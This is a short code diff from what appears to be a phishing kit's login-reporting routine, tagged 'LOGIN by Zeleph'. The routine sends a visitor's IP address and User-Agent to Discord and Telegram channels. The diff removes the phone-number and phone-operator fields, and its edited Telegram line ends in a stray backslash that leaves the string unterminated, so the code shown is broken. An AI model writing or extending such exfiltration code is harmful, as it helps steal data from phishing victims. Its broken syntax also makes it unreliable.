@@ -127,8 +127,6 @@
       fields: [
         { name: "🌐 Adresse IP", value: ip, inline: false },
         { name: "🌐 User-Agent", value: ua, inline: false },
-        { name: "🚀 Opérateur Téléphonique", value: operateur, inline: true },
-        { name: "🚀 Téléphone", value: telephone, inline: true }
       ],
       timestamp: new Date().toISOString()
     };
@@ -136,9 +134,7 @@
     const telegramText =
       `[🌐] LOGIN by Zeleph [🌐]\n\n` +
       `🌐 Adresse IP : ${ip}\n` +
-      `🌐 User-Agent : ${ua}\n\n` +
-      `🚀 Opérateur Téléphonique : ${operateur}\n` +
-      `🚀 Téléphone : ${telephone}`;
+      `🌐 User-Agent : ${ua}\`;
 
     await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);
 
